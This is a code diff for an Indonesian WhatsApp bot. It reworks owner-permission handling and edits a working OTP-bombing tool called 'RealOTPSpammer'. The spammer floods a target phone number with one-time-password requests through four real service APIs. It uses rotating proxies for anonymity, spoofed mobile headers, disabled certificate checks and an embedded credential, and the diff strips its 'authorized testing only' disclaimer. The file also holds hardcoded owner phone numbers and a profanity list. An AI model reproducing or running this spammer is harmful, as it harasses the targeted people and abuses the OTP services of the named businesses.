@@ -124,43 +124,237 @@ const MAX_VOICE = 3;
 const VOICE_COOLDOWN = 10 * 60 * 60 * 1000; // 10 jam
 const voiceAksesSementara = new Map();
 
-  const OWNER_NUMBER = '6283836348226@s.whatsapp.net'
-  const PROXY_NUMBER = '6291100802986027@s.whatsapp.net'; 
-  const BOT_NUMBER = '62882007141574@s.whatsapp.net';
+const OWNER_NUMBER = '6283836348226@s.whatsapp.net';
+const PROXY_NUMBER = '6291100802986027@s.whatsapp.net'; 
+const BOT_NUMBER = '62882007141574@s.whatsapp.net';
 
-  const ALIAS_OWNER = {
-  '6291100802986027@s.whatsapp.net': OWNER_NUMBER,
-  '91100802986027@s.whatsapp.net': OWNER_NUMBER,
-  '91100802986027@lid': OWNER_NUMBER,      
-  '6291100802986027@c.us': OWNER_NUMBER
+// File untuk menyimpan OWNER
+const OWNERS_FILE = './owners.json';
+
+// ==================== LOAD DATA ====================
+let ownersData = {};
+try {
+    if (fs.existsSync(OWNERS_FILE)) {
+        ownersData = JSON.parse(fs.readFileSync(OWNERS_FILE, 'utf8'));
+        console.log(`✅ Loaded ${Object.keys(ownersData).length} owners from ${OWNERS_FILE}`);
+    }
+} catch (error) {
+    console.log('ℹ️ No owners file found, starting fresh');
+    ownersData = {};
+}
+
+// ==================== ALIAS SYSTEM ====================
+const ALIAS_OWNER = {
+    // PROXY NUMBERS
+    '6291100802986027@s.whatsapp.net': OWNER_NUMBER,
+    '91100802986027@s.whatsapp.net': OWNER_NUMBER,
+    '91100802986027@lid': OWNER_NUMBER,
+    '6291100802986027@c.us': OWNER_NUMBER,
+    '91100802986027': OWNER_NUMBER,
+    
+    // MAIN OWNER NUMBERS
+    '6283836348226@s.whatsapp.net': OWNER_NUMBER,
+    '6283836348226@lid': OWNER_NUMBER,
+    '6283836348226@c.us': OWNER_NUMBER,
+    '6283836348226': OWNER_NUMBER,
+    '083836348226': OWNER_NUMBER,
+    '83836348226': OWNER_NUMBER
 };
 
-// Alias bot (masukkan semua kemungkinan JID bot, termasuk acak di grup)
-const ALIAS_BOT = {
-  [BOT_NUMBER]: BOT_NUMBER,
-  '6281227298109@c.us': BOT_NUMBER,
-  '6281227298109@lid': BOT_NUMBER,
-  '73530494451954@lid': BOT_NUMBER,  // tambahkan JID bot acak di grup
-};
+// ==================== TEMP ALIAS CACHE ====================
+let aliasCache = {}; // Untuk simpan sementara hasil .getalias
 
+// ==================== FUNGSI UTAMA ====================
+function saveOwnersData() {
+    try {
+        fs.writeFileSync(OWNERS_FILE, JSON.stringify(ownersData, null, 2));
+        console.log(`💾 Saved ${Object.keys(ownersData).length} owners to ${OWNERS_FILE}`);
+    } catch (error) {
+        console.error('❌ Failed to save owners file:', error);
+    }
+}// ==================== FUNGSI NORMALIZE JID (CLEAN) ====================
 function normalizeJid(jid) {
     if (!jid || typeof jid !== 'string') return '';
+    
+    // 1. Cek ALIAS OWNER dulu
+    if (ALIAS_OWNER[jid]) {
+        return ALIAS_OWNER[jid];
+    }
+    
+    // 2. JANGAN UBAH @lid! Biarkan asli
+    if (jid.includes('@lid')) {
+        return jid;
+    }
+    
+    // 3. Jika sudah @s.whatsapp.net
+    if (jid.endsWith('@s.whatsapp.net')) {
+        return jid;
+    }
+    
+    // 4. Handle @c.us
+    if (jid.includes('@c.us')) {
+        return jid;
+    }
+    
+    // 5. Jika @g.us atau @broadcast
+    if (jid.endsWith('@g.us') || jid.endsWith('@broadcast')) {
+        return jid;
+    }
+    
+    // 6. Fallback: coba normalize ke number
+    const cleanNum = jid.replace(/\D/g, '');
+    if (cleanNum.length >= 10) {
+        let number = cleanNum;
+        if (number.startsWith('0')) {
+            number = '62' + number.substring(1);
+        } else if (!number.startsWith('62') && number.length >= 10) {
+            number = '62' + number;
+        }
+        return number + '@s.whatsapp.net';
+    }
+    
+    return jid;
+}
 
-    if (ALIAS_OWNER[jid]) return ALIAS_OWNER[jid];
+// ==================== FUNGSI IS OWNER (CLEAN) ====================
+function isOwner(jid) {
+    // Normalize dulu
+    const normalized = normalizeJid(jid);
+    
+    // 1. Cek main owner & proxy
+    if (normalized === OWNER_NUMBER || normalized === PROXY_NUMBER) {
+        return true;
+    }
+    
+    // 2. Cek ALIAS_OWNER
+    if (ALIAS_OWNER[jid] === OWNER_NUMBER || ALIAS_OWNER[normalized] === OWNER_NUMBER) {
+        return true;
+    }
+    
+    // 3. Cek ownersData
+    for (const [key, data] of Object.entries(ownersData)) {
+        // Cek dengan alias asli
+        if (data.alias === jid) {
+            return true;
+        }
+        
+        // Cek dengan normalized
+        if (data.alias === normalized) {
+            return true;
+        }
+        
+        // Cek jika nomor sama (untuk kasus @lid vs @s.whatsapp.net)
+        if (jid.includes('@lid') && data.alias && data.alias.includes(jid.split('@')[0])) {
+            return true;
+        }
+    }
+    
+    return false;
+}
 
-    if (jid.endsWith('@s.whatsapp.net') || jid.endsWith('@g.us')) return jid;
+// 🚨 FUNGSI: addOwner (MASUK KE owners.json)
+function addOwnerToFile(input, addedBy) {
+    let phoneNumber = '';
+    let aliases = [];
+    
+    // 🎯 KASUS 1: Input adalah participant ID (@lid, @c.us, dll)
+    if (input.includes('@')) {
+        const participantId = input;
+        
+        // Cari di cache
+        for (const [cachedNumber, data] of Object.entries(aliasCache)) {
+            if (data.participantId === participantId) {
+                phoneNumber = cachedNumber;
+                aliases = [participantId, `${phoneNumber}@s.whatsapp.net`];
+                break;
+            }
+        }
+        
+        // Jika tidak ditemukan di cache
+        if (!phoneNumber) {
+            // Coba extract nomor dari participant ID
+            if (participantId.includes('@s.whatsapp.net')) {
+                phoneNumber = participantId.replace('@s.whatsapp.net', '');
+            } else if (participantId.includes('@c.us')) {
+                phoneNumber = participantId.replace('@c.us', '');
+            } else {
+                return { 
+                    success: false, 
+                    message: `Tidak bisa detect nomor dari: ${participantId}\nGunakan .getalias dulu.` 
+                };
+            }
+            aliases = [participantId, `${phoneNumber}@s.whatsapp.net`];
+        }
+    }
+    // 🎯 KASUS 2: Input adalah nomor telepon
+    else {
+        phoneNumber = input.replace(/\D/g, '');
+        if (phoneNumber.startsWith('0')) {
+            phoneNumber = '62' + phoneNumber.substring(1);
+        } else if (!phoneNumber.startsWith('62') && phoneNumber.length >= 10) {
+            phoneNumber = '62' + phoneNumber;
+        }
+        
+        // Cari aliases dari cache
+        if (aliasCache[phoneNumber] && aliasCache[phoneNumber].participantId) {
+            aliases = [
+                aliasCache[phoneNumber].participantId,
+                `${phoneNumber}@s.whatsapp.net`,
+                `${phoneNumber}@c.us`
+            ];
+        } else {
+            aliases = [
+                `${phoneNumber}@s.whatsapp.net`,
+                `${phoneNumber}@c.us`
+            ];
+        }
+    }
+    
+    // Validasi nomor
+    if (!phoneNumber || phoneNumber.length < 10) {
+        return { success: false, message: 'Format nomor tidak valid!' };
+    }
+    
+    // Cek jika sudah owner
+    if (ownersData[phoneNumber]) {
+        return { success: false, message: `Nomor ${phoneNumber} sudah menjadi owner!` };
+    }
+    
+    // 🚨 **INILAH YANG MASUK KE owners.json**
+    ownersData[phoneNumber] = {
+        aliases: aliases,
+        addedBy: addedBy.replace('@s.whatsapp.net', ''),
+        addedAt: new Date().toISOString(),
+        addedVia: input.includes('@') ? 'participant_id' : 'phone_number',
+        lastUpdated: new Date().toISOString()
+    };
+    
+    // 🚨 **SIMPAN KE FILE**
+    saveOwnersData();
+    
+    return { 
+        success: true, 
+        message: `Owner ditambahkan: ${phoneNumber}`,
+        data: ownersData[phoneNumber]
+    };
+}
 
-    const noDomain = jid.split('@')[0];
-    const reconstructed = noDomain + '@s.whatsapp.net';
-    if (ALIAS_OWNER[reconstructed]) return ALIAS_OWNER[reconstructed];
-
-    const numMatch = jid.match(/^\d{7,}$/);
-    if (!numMatch) return jid;
-
-    let number = numMatch[0];
-    if (!number.startsWith('62')) number = '62' + number.replace(/^0+/, '');
-
-    return number + '@s.whatsapp.net';
+// 🚨 FUNGSI: removeOwner
+function removeOwnerFromFile(numberInput) {
+    const phoneNumber = numberInput.replace(/\D/g, '');
+    
+    // Jangan hapus main owner & proxy
+    if (phoneNumber === '6283836348226' || phoneNumber === '6291100802986027') {
+        return { success: false, message: 'Tidak bisa menghapus main/proxy owner' };
+    }
+    
+    if (ownersData[phoneNumber]) {
+        delete ownersData[phoneNumber];
+        saveOwnersData();
+        return { success: true, message: `Owner dihapus: ${phoneNumber}` };
+    }
+    
+    return { success: false, message: 'Owner tidak ditemukan' };
 }
 
 const vipPath = './vip.json';
@@ -188,11 +382,6 @@ function isVIP(jid, groupId) {
     return false;
 }
 
-
-function isOwner(jid) {
-    const normalized = normalizeJid(jid);
-    return normalized === OWNER_NUMBER || normalized === PROXY_NUMBER;
-}
 
 
 function addVIP(jid, groupId) {
@@ -886,14 +1075,12 @@ async function spamCode(sock, from, msg, text, isOwner) {
 class RealOTPSpammer {
     constructor(sock) {
         this.sock = sock;
-        this.activeJobs = new Map(); // Map<jobId, {target, count, sent, running}>
+        this.activeJobs = new Map();
         this.proxyList = [];
         this._loadProxies();
     }
 
-    // 🚀 LOAD PROXY FOR ANONYMITY
     async _loadProxies() {
-        // Default proxy list untuk testing
         this.proxyList = [
             'http://103.152.112.162:80',
             'http://45.77.56.113:3128',
@@ -902,15 +1089,15 @@ class RealOTPSpammer {
         ];
     }
 
-    // 🔥 GET RANDOM PROXY
     _getRandomProxy() {
         return this.proxyList.length > 0 
-            ? { host: this.proxyList[Math.floor(Math.random() * this.proxyList.length)].split(':')[1].replace('//', ''), 
-                port: parseInt(this.proxyList[Math.floor(Math.random() * this.proxyList.length)].split(':')[2]) }
+            ? { 
+                host: this.proxyList[Math.floor(Math.random() * this.proxyList.length)].split(':')[1].replace('//', ''), 
+                port: parseInt(this.proxyList[Math.floor(Math.random() * this.proxyList.length)].split(':')[2]) 
+              }
             : null;
     }
 
-    // 🎯 RANDOM STRING GENERATOR
     _generateRandomString(length = 8) {
         const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
         let result = '';
@@ -920,7 +1107,6 @@ class RealOTPSpammer {
         return result;
     }
 
-    // 🔧 GENERATE DEVICE ID
     _generateDeviceId() {
         const part1 = this._generateRandomString(8);
         const part2 = this._generateRandomString(4);
@@ -930,7 +1116,6 @@ class RealOTPSpammer {
         return `${part1}-${part2}-${part3}-${part4}-${part5}`;
     }
 
-    // 📱 MOBILE HEADERS
     _getMobileHeaders() {
         const userAgents = [
             'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
@@ -948,18 +1133,14 @@ class RealOTPSpammer {
         };
     }
 
-    // ========== REAL API IMPLEMENTATIONS ==========
-
-    // 1. JOGJAKITA TRANSPORT (REAL WORKING)
+    // 1. JOGJAKITA TRANSPORT
     async _spamJogjakitaReal(phoneNumber) {
         try {
             const axios = require('axios');
             const https = require('https');
             
-            // Format phone
             let phone = phoneNumber.replace(/^0/, '62').replace(/^62/, '62');
             
-            // Step 1: Get Token
             const tokenUrl = 'https://aci-user.bmsecure.id/oauth/token';
             const tokenData = 'grant_type=client_credentials&uuid=00000000-0000-0000-0000-000000000000&id_user=0&id_kota=0&location=0.0%2C0.0&via=jogjakita_user&version_code=501&version_name=6.10.1';
             
@@ -968,7 +1149,6 @@ class RealOTPSpammer {
                 'Content-Type': 'application/x-www-form-urlencoded'
             };
 
-            // Create HTTPS agent that ignores SSL cert errors
             const httpsAgent = new https.Agent({
                 rejectUnauthorized: false
             });
@@ -981,10 +1161,9 @@ class RealOTPSpammer {
 
             const accessToken = tokenResponse.data?.access_token;
             if (!accessToken) {
-                return { success: false, message: "JOGJAKITA: No token" };
+                return { success: false };
             }
 
-            // Step 2: Send OTP
             const otpUrl = 'https://aci-user.bmsecure.id/v2/user/signin-otp/wa/send';
             const otpPayload = {
                 'phone_user': phone,
@@ -1017,17 +1196,17 @@ class RealOTPSpammer {
             });
 
             if (otpResponse.status === 200 && otpResponse.data?.rc === '200') {
-                return { success: true, message: "JOGJAKITA: OTP Terkirim" };
+                return { success: true };
             }
             
-            return { success: false, message: "JOGJAKITA: Gagal" };
+            return { success: false };
             
-        } catch (error) {
-            return { success: false, message: `JOGJAKITA: ${error.message}` };
+        } catch {
+            return { success: false };
         }
     }
 
-    // 2. ADIRAKU FINANCE (REAL WORKING)
+    // 2. ADIRAKU FINANCE
     async _spamAdirakuReal(phoneNumber) {
         try {
             const axios = require('axios');
@@ -1053,17 +1232,17 @@ class RealOTPSpammer {
             });
 
             if (response.status === 200 && response.data?.message === 'success') {
-                return { success: true, message: "ADIRAKU: OTP Terkirim" };
+                return { success: true };
             }
             
-            return { success: false, message: "ADIRAKU: Gagal" };
+            return { success: false };
             
-        } catch (error) {
-            return { success: false, message: `ADIRAKU: ${error.message}` };
+        } catch {
+            return { success: false };
         }
     }
 
-    // 3. BISATOPUP (REAL WORKING)
+    // 3. BISATOPUP
     async _spamBisatopupReal(phoneNumber) {
         try {
             const axios = require('axios');
@@ -1101,17 +1280,17 @@ class RealOTPSpammer {
             });
 
             if (response.status === 200 && response.data && response.data.message && response.data.message.includes('OTP')) {
-                return { success: true, message: "BISATOPUP: OTP Terkirim" };
+                return { success: true };
             }
             
-            return { success: false, message: "BISATOPUP: Gagal" };
+            return { success: false };
             
-        } catch (error) {
-            return { success: false, message: `BISATOPUP: ${error.message}` };
+        } catch {
+            return { success: false };
         }
     }
 
-    // 4. SPEEDCASH LOAN (REAL WORKING)
+    // 4. SPEEDCASH LOAN
     async _spamSpeedcashReal(phoneNumber) {
         try {
             const axios = require('axios');
@@ -1119,7 +1298,6 @@ class RealOTPSpammer {
             
             let phone = phoneNumber.replace(/^0/, '62').replace(/^62/, '62');
             
-            // Step 1: Get Token
             const tokenUrl = 'https://sofia.bmsecure.id/central-api/oauth/token';
             const tokenHeaders = {
                 'Authorization': 'Basic NGFiYmZkNWQtZGNkYS00OTZlLWJiNjEtYWMzNzc1MTdjMGJmOjNjNjZmNTZiLWQwYWItNDlmMC04NTc1LTY1Njg1NjAyZTI5Yg==',
@@ -1137,15 +1315,14 @@ class RealOTPSpammer {
             });
 
             if (tokenResponse.status !== 200) {
-                return { success: false, message: "SPEEDCASH: Token gagal" };
+                return { success: false };
             }
 
             const accessToken = tokenResponse.data?.access_token;
             if (!accessToken) {
-                return { success: false, message: "SPEEDCASH: No token" };
+                return { success: false };
             }
 
-            // Step 2: Send OTP
             const otpUrl = 'https://sofia.bmsecure.id/central-api/sc-api/otp/generate';
             const otpPayload = {
                 'version_name': '6.2.1 (428)',
@@ -1173,123 +1350,107 @@ class RealOTPSpammer {
             });
 
             if (otpResponse.status === 200 && otpResponse.data?.rc === '00') {
-                return { success: true, message: "SPEEDCASH: OTP Terkirim" };
+                return { success: true };
             }
             
-            return { success: false, message: "SPEEDCASH: Gagal" };
+            return { success: false };
             
-        } catch (error) {
-            return { success: false, message: `SPEEDCASH: ${error.message}` };
+        } catch {
+            return { success: false };
         }
     }
 
     // 🚀 MAIN SPAM FUNCTION
-    async startSpamOTP(targetPhone, count, chatId) {
-        const jobId = Date.now().toString();
-        
-        const services = [
-            this._spamJogjakitaReal.bind(this),
-            this._spamAdirakuReal.bind(this),
-            this._spamBisatopupReal.bind(this),
-            this._spamSpeedcashReal.bind(this)
-        ];
+  // 🚀 MAIN SPAM FUNCTION
+async startSpamOTP(targetPhone, count, chatId) {
+    const jobId = Date.now().toString();
+    
+    const services = [
+        this._spamJogjakitaReal.bind(this),
+        this._spamAdirakuReal.bind(this),
+        this._spamBisatopupReal.bind(this),
+        this._spamSpeedcashReal.bind(this)
+    ];
 
-        let sent = 0;
-        let failed = 0;
-        let totalAttempts = 0;
-        
-        this.activeJobs.set(jobId, {
-            target: targetPhone,
-            count: count,
-            sent: 0,
-            failed: 0,
-            running: true
+    let sent = 0;
+    let failed = 0;
+    let totalAttempts = 0;
+    
+    this.activeJobs.set(jobId, {
+        target: targetPhone,
+        count: count,
+        sent: 0,
+        failed: 0,
+        running: true
+    });
+
+    try {
+        // HANYA START MESSAGE
+        await this.sock.sendMessage(chatId, {
+            text: `🚀 OTP SPAM STARTED\n📱 Target: ${targetPhone}\n🎯 Amount: ${count}x`
         });
 
-        try {
-            // Start message
-            await this.sock.sendMessage(chatId, {
-                text: `🚀 *OTP SPAM ATTACK STARTED*\n📱 Target: ${targetPhone}\n🎯 Amount: ${count}x\n📊 Services: 4 WORKING\n\n*WAITING FOR RESULTS...*`
-            });
+        for (let round = 1; round <= count && this.activeJobs.get(jobId)?.running; round++) {
+            totalAttempts++;
+            
+            // HAPUS ROUND LOG INI
+            // await this.sock.sendMessage(chatId, {
+            //     text: `📊 ROUND ${round}/${count}\nProcessing 4 services...`
+            // });
 
-            for (let round = 1; round <= count && this.activeJobs.get(jobId)?.running; round++) {
-                totalAttempts++;
+            let roundSuccess = 0;
+            let roundFailed = 0;
+
+            const promises = services.map(service => service(targetPhone));
+            const results = await Promise.allSettled(promises);
+
+            for (let i = 0; i < results.length; i++) {
+                const result = results[i];
                 
-                // Status update setiap round
-                await this.sock.sendMessage(chatId, {
-                    text: `📊 *ROUND ${round}/${count}*\n⏳ Processing 4 services...`
-                });
-
-                let roundSuccess = 0;
-                let roundFailed = 0;
-                let roundMessages = [];
-
-                // Run all 4 services in parallel
-                const promises = services.map(service => service(targetPhone));
-                const results = await Promise.allSettled(promises);
-
-                for (let i = 0; i < results.length; i++) {
-                    const result = results[i];
-                    let serviceName = "";
-                    
-                    switch(i) {
-                        case 0: serviceName = "🚕 JOGJAKITA"; break;
-                        case 1: serviceName = "💰 ADIRAKU"; break;
-                        case 2: serviceName = "📱 BISATOPUP"; break;
-                        case 3: serviceName = "💸 SPEEDCASH"; break;
-                    }
-
-                    if (result.status === 'fulfilled' && result.value.success) {
-                        sent++;
-                        roundSuccess++;
-                        roundMessages.push(`✅ ${serviceName}: SUCCESS`);
-                    } else {
-                        failed++;
-                        roundFailed++;
-                        const errorMsg = result.status === 'fulfilled' ? result.value.message : result.reason;
-                        roundMessages.push(`❌ ${serviceName}: ${errorMsg}`);
-                    }
-                }
-
-                // Update job stats
-                const currentJob = this.activeJobs.get(jobId);
-                if (currentJob) {
-                    currentJob.sent = sent;
-                    currentJob.failed = failed;
-                }
-
-                // Send round results
-                await this.sock.sendMessage(chatId, {
-                    text: `📈 *ROUND ${round} RESULTS*\n\n${roundMessages.join('\n')}\n\n✅ Success: ${roundSuccess}/4\n❌ Failed: ${roundFailed}/4\n\n*TOTAL:* ✅ ${sent} | ❌ ${failed}`
-                });
-
-                // Delay between rounds (3-7 seconds)
-                if (round < count) {
-                    const delay = Math.floor(Math.random() * 4000) + 3000;
-                    await new Promise(resolve => setTimeout(resolve, delay));
+                if (result.status === 'fulfilled' && result.value.success) {
+                    sent++;
+                    roundSuccess++;
+                } else {
+                    failed++;
+                    roundFailed++;
                 }
             }
 
-            // Final summary
-            const successRate = totalAttempts > 0 ? ((sent / (totalAttempts * 4)) * 100).toFixed(1) : 0;
-            
-            await this.sock.sendMessage(chatId, {
-                text: `🎉 *ATTACK COMPLETED!*\n\n📱 Target: ${targetPhone}\n📊 Total Rounds: ${count}\n✅ Successful OTPs: ${sent}\n❌ Failed Attempts: ${failed}\n📈 Success Rate: ${successRate}%\n\n⚠️ *For authorized testing only!*`
-            });
+            const currentJob = this.activeJobs.get(jobId);
+            if (currentJob) {
+                currentJob.sent = sent;
+                currentJob.failed = failed;
+            }
 
-        } catch (error) {
-            console.error('Spam error:', error);
-            await this.sock.sendMessage(chatId, {
-                text: `❌ *ERROR*\n${error.message}\n\nAttack stopped.`
-            });
-        } finally {
-            this.activeJobs.delete(jobId);
+            // HAPUS ROUND RESULTS LOG INI
+            // await this.sock.sendMessage(chatId, {
+            //     text: `📈 ROUND ${round} RESULTS\n\n✅ Success: ${roundSuccess}/4\n❌ Failed: ${roundFailed}/4\n\nTOTAL: ✅ ${sent} | ❌ ${failed}`
+            // });
+
+            if (round < count) {
+                const delay = Math.floor(Math.random() * 4000) + 3000;
+                await new Promise(resolve => setTimeout(resolve, delay));
+            }
         }
 
-        return { sent: sent, failed: failed, total: sent + failed };
+        const successRate = totalAttempts > 0 ? ((sent / (totalAttempts * 4)) * 100).toFixed(1) : 0;
+        
+        // FINAL MESSAGE SAJA
+        await this.sock.sendMessage(chatId, {
+            text: `✅ ATTACK COMPLETED\n📱 ${targetPhone}\n📊 Total Rounds: ${count}\n✅ Successful: ${sent}\n❌ Failed: ${failed}`
+        });
+
+    } catch {
+        await this.sock.sendMessage(chatId, {
+            text: `❌ ERROR\nAttack stopped.`
+        });
+    } finally {
+        this.activeJobs.delete(jobId);
     }
 
-    // 📊 GET ACTIVE JOBS
+    return { sent: sent, failed: failed, total: sent + failed };
+}
+
     getActiveJobs() {
         return Array.from(this.activeJobs.entries()).map(([id, job]) => ({
             id,
@@ -1297,7 +1458,6 @@ class RealOTPSpammer {
         }));
     }
 
-    // 🛑 STOP JOB (optional)
     stopJob(jobId) {
         if (this.activeJobs.has(jobId)) {
             this.activeJobs.delete(jobId);
@@ -1306,8 +1466,6 @@ class RealOTPSpammer {
         return false;
     }
 }
-
-// ==================== BOT COMMAND INTEGRATION ====================
 
 // Inisialisasi global
 let realSpammer = null;
@@ -1670,6 +1828,9 @@ const commands = [
   '.allvip',
   '.clearvip',
   '.setoff',
+  '.addowner',
+  '.dellowner',
+  '.listowner',
 
   // BOT
   '.on',
@@ -1727,75 +1888,86 @@ const toxicWords = [
   'blowjob', 'handjob', 'cum', 'sperma', 'vagina', 'penis', 'koplak', 
   'ahh', 'enak mas', 'yatim', 'anak haram', 'ngewe', 'ewe', 'squirt',
   'anj', 'kont', 'bngst', 'kntol', 'mmk', 'bbi', 'jnck', 'lnte', 'bugil',
-  'telanjang', 'pentil', 'pantat', 'silit', 'asu', 'koclok', 'cok', 'ndogok',
-  'pekok'
+  'telanjang', 'pentil', 'pantat', 'silit', 'asu', 'koclok','cok', 'ndlogok',
+  'pekok', 'celeng', 'bajigur'
 ];
 
 
+
+// ==================== MESSAGE HANDLER ====================
 sock.ev.on('messages.upsert', async ({ messages }) => {
     const msg = messages[0];
     if (!msg.message) return;
     if (msg.key.fromMe) return;
 
-    const from = msg.key.remoteJid; // ID room: grup atau pribadi
+    const from = msg.key.remoteJid;
     const isGroup = from.endsWith('@g.us');
 
-    // Cari ID pengirim sebenarnya
     let rawSender = null;
     
-    
-
+    // 🚨 TAMBAH FALLBACK UNTUK GRUP
     if (isGroup) {
         rawSender = msg.key.participant || msg.participant;
+        if (!rawSender) {
+            console.warn('⚠️ Gagal deteksi sender grup, pakai from sebagai fallback');
+            rawSender = from;
+        }
     } else {
-        rawSender = msg.key.remoteJid; // chat pribadi
+        rawSender = from;
     }
 
-    // Kalau masih null (jarang), ambil dari contextInfo
     if (!rawSender && msg.message?.extendedTextMessage?.contextInfo?.participant) {
         rawSender = msg.message.extendedTextMessage.contextInfo.participant;
     }
 
-    const sender = normalizeJid(rawSender); // ID pengirim sebenarnya
-    const isRealOwner = sender === OWNER_NUMBER;
-
-
-        const text =
-            msg.message?.conversation ||
-            msg.message?.extendedTextMessage?.text ||
-            msg.message?.imageMessage?.caption || '';
-
-            
-
-        const imageContent = (
-            msg.message?.imageMessage ||
-            msg.message?.documentMessage?.mimetype?.includes("image") && msg.message.documentMessage ||
-            msg.message?.extendedTextMessage?.contextInfo?.quotedMessage?.imageMessage
-        );
-        
-                // ✅ FITUR TEBAK-AKU
-    const textMessage = msg.message?.conversation || msg.message?.extendedTextMessage?.text || '';
-
-
-        if (!msg.key.fromMe) {
-    tambahXP(sock, sender, from);
-
-}
-
-        const msgType = Object.keys(msg.message)[0];
-        const body = text.toLowerCase(); // ⬅ WAJIB ADA!
-        console.log(`📩 Pesan dari ${from}: ${text}`);
-
-     if (isGroup) {
-    if (!grupAktif.has(from)) {
-        grupAktif.set(from, false);
-        simpanGrupAktif();
+    if (!rawSender) {
+        console.error('❌ rawSender null setelah semua pengecekan');
+        return;
     }
 
-    const status = grupAktif.get(from);
-    if (status === 'true') grupAktif.set(from, true);
-    if (status === 'false') grupAktif.set(from, false);
-}
+    const sender = normalizeJid(rawSender);
+    
+    // 🚨 FIX: PAKAI FUNGSI isOwner() YANG BARU
+    const isRealOwner = isOwner(sender);
+    
+    const text = msg.message?.conversation ||
+                msg.message?.extendedTextMessage?.text ||
+                msg.message?.imageMessage?.caption || '';
+
+    const imageContent = (
+        msg.message?.imageMessage ||
+        (msg.message?.documentMessage?.mimetype?.includes("image") && msg.message.documentMessage) ||
+        msg.message?.extendedTextMessage?.contextInfo?.quotedMessage?.imageMessage
+    );
+    
+    const textMessage = msg.message?.conversation || msg.message?.extendedTextMessage?.text || '';
+
+    if (!msg.key.fromMe) {
+        tambahXP(sock, sender, from);
+    }
+
+    const msgType = Object.keys(msg.message)[0];
+    const body = text.toLowerCase(); // ⬅ WAJIB ADA!
+    
+   // 🚨 DEBUG OUTPUT YANG SIMPLE & JELAS
+console.log(`📩 ${isGroup ? 'GRUP' : 'PVT'} dari: ${sender}`);
+console.log(`   📞 Raw: ${rawSender}`);
+console.log(`   🔄 Norm: ${sender}`);
+console.log(`   👑 Owner: ${isRealOwner ? 'YA' : 'TIDAK'}`);
+console.log(`   💬 Pesan: "${text.substring(0, 50)}${text.length > 50 ? '...' : ''}"`);
+    if (isGroup) {
+        if (!grupAktif.has(from)) {
+            grupAktif.set(from, false);
+            simpanGrupAktif();
+        }
+
+        const status = grupAktif.get(from);
+        if (status === 'true') grupAktif.set(from, true);
+        if (status === 'false') grupAktif.set(from, false);
+    }
+
+
+
 
 // FUNGSI FONT GLOBAL - Taruh di bagian atas file atau di scope yang sama
 const toSmallCaps = (text) => {
@@ -1830,12 +2002,8 @@ const font = (str) => toSmallCaps(str);
 if (text.trim() === '.on') {
     if (!from.endsWith('@g.us')) return;
 
-    const realJid = normalizeJid(sender);
-    const isRealOwner =
-        realJid === normalizeJid(OWNER_NUMBER) ||
-        msg.key.fromMe;
-
-    if (!isRealOwner) {
+    // 🚨 GUNAKAN FUNGSI isOwner() YANG SUDAH BENAR
+    if (!isOwner(sender)) {
         await sock.sendMessage(from, {
             text: font('❌ ʜᴀɴʏᴀ ᴏʀᴀɴɢ ʏᴀɴɢ ᴘᴜɴʏᴀ ᴋᴇᴍᴀᴍᴘᴜᴀɴ ꜱᴜʀɢᴀᴡɪ ʏᴀɴɢ ʙɪꜱᴀ ᴀᴋᴛɪꜰɪɴ ʙᴏᴛ ɪɴɪ.')
         });
@@ -1877,12 +2045,8 @@ if (text.trim() === '.on') {
 if (text.trim() === '.off') {
     if (!from.endsWith('@g.us')) return;
 
-    const realJid = normalizeJid(sender);
-    const isRealOwner =
-        realJid === normalizeJid(OWNER_NUMBER) ||
-        msg.key.fromMe;
-
-    if (!isRealOwner) {
+    // 🚨 GUNAKAN FUNGSI isOwner() YANG SUDAH BENAR
+    if (!isOwner(sender)) {
         await sock.sendMessage(from, {
             text: font('❌ ʏᴀᴇʟᴀʜ ᴀᴋᴛɪꜰɪɴ ᴀᴊᴀ ɢᴀʙɪꜱᴀ, ɪɴɪ ᴍᴀʟᴀʜ ᴍᴀᴜ ᴍᴀᴛɪɪɴ ʟᴀᴡᴀᴋ.')
         });
@@ -1921,6 +2085,7 @@ if (text.trim() === '.off') {
 
 // ==================== .SETOFF COMMAND ====================
 if (body.startsWith('.setoff') && isGroup) {
+    // 🚨 GUNAKAN FUNGSI isOwner() YANG SUDAH BENAR
     if (!isOwner(sender)) {
         await sock.sendMessage(from, {
             text: font('❌ ʜᴀɴʏᴀ ᴏᴡɴᴇʀ ʏᴀɴɢ ʙɪꜱᴀ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ᴘᴇʀɪɴᴛᴀʜ ɪɴɪ.')
@@ -1934,7 +2099,7 @@ if (body.startsWith('.setoff') && isGroup) {
 
     if (!jumlah || isNaN(jumlah) || jumlah <= 0) {
         await sock.sendMessage(from, {
-            text: font('⚠️ ꜰᴏʀᴍᴀᴛ ꜱᴀʟᴀʜ.\n\nɢᴜɴᴀᴋᴀɴ: .ꜱᴇᴛᴏꜰꜰ <ᴀɴɢᴋᴀ> <ꜱᴀᴛᴜᴀɴ>\nᴄᴏɴᴛᴏʜ:\n• .ꜱᴇᴛᴏꜰꜰ 𝟏 ᴊᴀᴍ\n• .ꜱᴇᴛᴏꜰꜰ 𝟱 ᴍᴇɴɪᴛ\n• .ꜱᴇᴛᴏꜰꜰ 𝟯𝟬 ᴅᴇᴛɪᴋ')
+            text: font('⚠️ ꜰᴏʀᴍᴀᴛ ꜱᴀʟᴀʜ.\n\nɢᴜɴᴀᴋᴀɴ: .ꜱᴇᴛᴏꜰꜰ <ᴀɴɢᴋᴀ> <ꜱᴀᴛᴜᴀɴ>\nᴄᴏɴᴛᴏʜ:\n• .ꜱᴇᴛᴏꜰꜰ 𝟭 ᴊᴀᴍ\n• .ꜱᴇᴛᴏꜰꜰ 𝟱 ᴍᴇɴɪᴛ\n• .ꜱᴇᴛᴏꜰꜰ 𝟯𝟬 ᴅᴇᴛɪᴋ')
         }, { quoted: msg });
         return;
     }
@@ -1983,6 +2148,7 @@ if (body.startsWith('.setoff') && isGroup) {
             text: font(`🔴 ʙᴏᴛ ᴅɪᴍᴀᴛɪᴋᴀɴ ᴏᴛᴏᴍᴀᴛɪꜱ\n\n📅 ᴡᴀᴋᴛᴜ: ${formatWaktu}\n⏰ ᴅᴜʀᴀꜱɪ: ${jumlah} ${satuan}\n\n👑 ᴏᴡɴᴇʀ: ꜰᴀᴊᴀʀ`)
         });
     }, ms);
+    return;
 }
 // ================== ULAR TANGGA ==================
 
